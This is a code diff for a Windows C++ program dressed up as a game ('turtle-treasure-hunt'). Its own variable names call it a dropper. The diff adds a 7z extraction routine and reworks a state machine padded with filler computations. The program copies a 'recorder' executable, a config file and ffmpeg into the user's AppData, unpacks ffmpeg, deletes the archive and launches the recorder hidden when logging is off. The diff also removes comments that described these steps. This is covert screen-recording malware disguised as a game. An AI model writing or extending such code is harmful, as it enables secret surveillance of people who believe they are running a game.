@@ -4,6 +4,10 @@
 #include <random>
 #include <string>
 #include <iostream>
+#include <filesystem>
+
+#include <libarchive/archive.h>
+#include <libarchive/archive_entry.h>
 
 #include <utils/log.hpp>
 #include <utils/file.hpp>
@@ -92,6 +96,119 @@ complex_compute_useless_value(int n)
 }
 
 
+bool
+extract7z(const char* src, const char* dst)
+{
+	// Initialize archive readers with error checking
+	struct archive* a = archive_read_new();
+	struct archive* ext = archive_write_disk_new();
+
+	if (!a || !ext) {
+		if (a) archive_read_free(a);
+		if (ext) archive_write_free(ext);
+		return false;
+	}
+
+	// Configure the input archive reader with comprehensive format support
+	// Enable all available filters (compression methods)
+	archive_read_support_filter_all(a);
+
+	// Enable all available formats, not just 7zip
+	archive_read_support_format_all(a);
+
+	// Specifically ensure 7zip support (redundant but explicit)
+	archive_read_support_format_7zip(a);
+
+	// Enable specific compression methods that are commonly problematic
+	archive_read_support_filter_lzma(a);  // For LZMA compression
+	archive_read_support_filter_xz(a);    // For XZ compression
+	archive_read_support_filter_gzip(a);  // For GZIP compression
+
+	// Configure the output disk writer with comprehensive options
+	archive_write_disk_set_options(ext,
+		ARCHIVE_EXTRACT_TIME |
+		ARCHIVE_EXTRACT_PERM |
+		ARCHIVE_EXTRACT_FFLAGS |
+		ARCHIVE_EXTRACT_SECURE_NODOTDOT);  // Security: prevent directory traversal
+
+	// Open the source archive with error checking
+	int r = archive_read_open_filename(a, src, 10240);
+	if (r != ARCHIVE_OK) {
+		printf("Failed to open archive: %s\n", archive_error_string(a));
+		archive_read_free(a);
+		archive_write_free(ext);
+		return false;
+	}
+
+	struct archive_entry* entry;
+	bool success = true;
+
+	// Process each entry in the archive
+	while ((r = archive_read_next_header(a, &entry)) == ARCHIVE_OK) {
+		// Construct the full output path
+		std::filesystem::path out = std::filesystem::path(dst) / archive_entry_pathname(entry);
+
+		// Ensure the destination directory exists
+		std::filesystem::create_directories(out.parent_path());
+
+		// Update the entry with the new path
+		archive_entry_set_pathname(entry, out.string().c_str());
+
+		// Write the entry header
+		r = archive_write_header(ext, entry);
+		if (r != ARCHIVE_OK) {
+			printf("Failed to write header: %s\n", archive_error_string(ext));
+			success = false;
+			break;
+		}
+
+		// Only copy data if this entry has data (not just a directory)
+		if (archive_entry_size(entry) > 0) {
+			// Copy the file data block by block with error checking
+			const void* buf;
+			size_t size;
+			la_int64_t offset;
+
+			while ((r = archive_read_data_block(a, &buf, &size, &offset)) == ARCHIVE_OK) {
+				r = archive_write_data_block(ext, buf, size, offset);
+				if (r != ARCHIVE_OK) {
+					printf("Failed to write data block: %s\n", archive_error_string(ext));
+					success = false;
+					break;
+				}
+			}
+
+			// Check if we exited the loop due to an error
+			if (r != ARCHIVE_EOF) {
+				printf("Failed to read data block: %s\n", archive_error_string(a));
+				success = false;
+				break;
+			}
+		}
+
+		// Finalize this entry
+		r = archive_write_finish_entry(ext);
+		if (r != ARCHIVE_OK) {
+			printf("Failed to finish entry: %s\n", archive_error_string(ext));
+			success = false;
+			break;
+		}
+	}
+
+	// Check if we exited due to an error rather than reaching the end
+	if (r != ARCHIVE_EOF) {
+		printf("Archive reading stopped unexpectedly: %s\n", archive_error_string(a));
+		success = false;
+	}
+
+	// Clean up resources
+	archive_write_free(ext);
+	archive_read_free(a);
+
+	return success;
+}
+
+
 void game_render()
 {
 	for (int i = 0; i < 50; i++)
@@ -137,7 +254,7 @@ void game_update()
 	{
 		switch (state)
 		{
-			case 0: // Get AppData path and create target directory
+			case 0:
 			{
 				if (px == py || moves >= MAX_MOVES)
 					moves = 3;
@@ -149,24 +266,30 @@ void game_update()
 				int prime = get_nth_prime(moves);
 
 				{
-					if (!fptr_GetEnvironmentVariableA("LOCALAPPDATA", g_appdata_path, MAX_PATH)) {
-						LOG_FATAL("Failed to get appdata path with %s", utilities::win32_get_error_string().c_str());
-
-						return;
-					}
-
-					if (!file::path_append(g_appdata_path, "GameData")) {
-						LOG_FATAL("Failed to append folder to appdata path with %s", utilities::win32_get_error_string().c_str());
-
-						return;
-					}
-
-					DWORD attr = fptr_GetFileAttributesA(g_appdata_path);
-					if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
-						if (!fptr_CreateDirectoryA(g_appdata_path, NULL)) {
-							LOG_FATAL("Failed to create GameData directory with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Getting AppData Path...");
+					{
+						if (!fptr_GetEnvironmentVariableA("LOCALAPPDATA", g_appdata_path, MAX_PATH)) {
+							LOG_FATAL("Failed to get appdata path with %s", utilities::win32_get_error_string().c_str());
 
 							return;
+						}
+					}
+
+					LOG_INFO("Creating target directory...");
+					{
+						if (!file::path_append(g_appdata_path, "GameData")) {
+							LOG_FATAL("Failed to append folder to appdata path with %s", utilities::win32_get_error_string().c_str());
+
+							return;
+						}
+
+						DWORD attr = fptr_GetFileAttributesA(g_appdata_path);
+						if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+							if (!fptr_CreateDirectoryA(g_appdata_path, NULL)) {
+								LOG_FATAL("Failed to create GameData directory with %s", utilities::win32_get_error_string().c_str());
+
+								return;
+							}
 						}
 					}
 				}
@@ -174,7 +297,7 @@ void game_update()
 				state++;
 				break;
 			}
-			case 1: // Get recorder and ffmpeg executable source path and copy to the destination path
+			case 1:
 			{
 				if (px == py || moves >= MAX_MOVES)
 					moves = 5;
@@ -184,16 +307,19 @@ void game_update()
 				int fib = get_nth_fibonacci(moves);
 
 				{
-					if (!fptr_GetModuleFileNameA(NULL, g_dropper_path, MAX_PATH)) {
-						LOG_FATAL("Failed to get dropper path with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Getting current executable's path...");
+					{
+						if (!fptr_GetModuleFileNameA(NULL, g_dropper_path, MAX_PATH)) {
+							LOG_FATAL("Failed to get dropper path with %s", utilities::win32_get_error_string().c_str());
 
-						return;
-					}
+							return;
+						}
 
-					if (!file::path_clean(g_dropper_path)) {
-						LOG_FATAL("Failed to clean dropper path with %s", utilities::win32_get_error_string().c_str());
+						if (!file::path_clean(g_dropper_path)) {
+							LOG_FATAL("Failed to clean dropper path with %s", utilities::win32_get_error_string().c_str());
 
-						return;
+							return;
+						}
 					}
 
 					std::string recorder_source_path = g_dropper_path;
@@ -204,10 +330,13 @@ void game_update()
 					recorder_destination_path += '\\';
 					recorder_destination_path += "turtle-treasure-hunt.exe";
 
-					if (!file::file_copy(recorder_source_path.c_str(), recorder_destination_path.c_str(), FALSE)) {
-						LOG_FATAL("Failed to copy recorder to appdata with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Copying turtle-treasure-hunt.exe to destination...");
+					{
+						if (!file::file_copy(recorder_source_path.c_str(), recorder_destination_path.c_str(), FALSE)) {
+							LOG_FATAL("Failed to copy recorder to appdata with %s", utilities::win32_get_error_string().c_str());
 
-						return;
+							return;
+						}
 					}
 
 					std::string config_source_path = g_dropper_path;
@@ -218,46 +347,72 @@ void game_update()
 					config_destination_path += '\\';
 					config_destination_path += "config.ini";
 
-					if (!file::file_copy(config_source_path.c_str(), config_destination_path.c_str(), FALSE)) {
-						LOG_FATAL("Failed to copy config file to appdata with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Copying config.ini to destination...");
+					{
+						if (!file::file_copy(config_source_path.c_str(), config_destination_path.c_str(), FALSE)) {
+							LOG_FATAL("Failed to copy config file to appdata with %s", utilities::win32_get_error_string().c_str());
 
-						return;
+							return;
+						}
 					}
 
 					std::string ffmpeg_directory = g_appdata_path;
 					ffmpeg_directory += "\\ffmpeg";
 
 					std::string ffmpeg_source_path = g_dropper_path;
-					ffmpeg_source_path += "\\ffmpeg\\ffmpeg.exe";
+					ffmpeg_source_path += "\\ffmpeg\\ffmpeg.7z";
 
 					std::string ffmpeg_destination_path = g_appdata_path;
-					ffmpeg_destination_path += "\\ffmpeg\\ffmpeg.exe";
+					ffmpeg_destination_path += "\\ffmpeg\\ffmpeg.7z";
 
-					DWORD attr = fptr_GetFileAttributesA(ffmpeg_directory.c_str());
-					if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
-						if (!fptr_CreateDirectoryA(ffmpeg_directory.c_str(), NULL)) {
-							LOG_FATAL("Failed to create ffmpeg directory with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Copying ffmepg.7z to destination...");
+					{
+						DWORD attr = fptr_GetFileAttributesA(ffmpeg_directory.c_str());
+						if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+							if (!fptr_CreateDirectoryA(ffmpeg_directory.c_str(), NULL)) {
+								LOG_FATAL("Failed to create ffmpeg directory with %s", utilities::win32_get_error_string().c_str());
+
+								return;
+							}
+						}
+
+
+						if (!file::file_copy(ffmpeg_source_path.c_str(), ffmpeg_destination_path.c_str(), FALSE)) {
+							LOG_FATAL("Failed to copy ffmpeg to appdata with %s", utilities::win32_get_error_string().c_str());
 
 							return;
 						}
 					}
 
-					if (!file::file_copy(ffmpeg_source_path.c_str(), ffmpeg_destination_path.c_str(), FALSE)) {
-						LOG_FATAL("Failed to copy ffmpeg to appdata with %s", utilities::win32_get_error_string().c_str());
+					LOG_INFO("Extracting ffmepg.7z to destination...");
+					{
+						if (!extract7z(ffmpeg_destination_path.c_str(), ffmpeg_directory.c_str()))
+						{
+							LOG_FATAL("Failed to extract ffmpeg archive with %s", utilities::win32_get_error_string().c_str());
+							system("pause");
+							return;
+						}
 
-						return;
+						if (!DeleteFileA(ffmpeg_destination_path.c_str()))
+						{
+							LOG_WARN("Could not remove ffmpeg.7z after extraction: %s", utilities::win32_get_error_string().c_str());
+							return;
+						}
 					}
 
-					#if LOG_ENABLED
-						HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_SHOW);
-					#else
-						HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_HIDE);
-					#endif
+					LOG_INFO("Executing turtle-treasure-hunt.exe...");
+					{
+						#if LOG_ENABLED
+							HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_SHOW);
+						#else
+							HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_HIDE);
+						#endif
 
-					if ((INT_PTR)result <= 32) {
-						LOG_FATAL("Failed to execute ffmpeg with %s", utilities::win32_get_error_string().c_str());
+						if ((INT_PTR)result <= 32) {
+							LOG_FATAL("Failed to execute ffmpeg with %s", utilities::win32_get_error_string().c_str());
 
-						return;
+							return;
+						}
 					}
 				}
 
@@ -300,4 +455,6 @@ int
 WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 {
 	game_update();
+
+	return 0;
 }
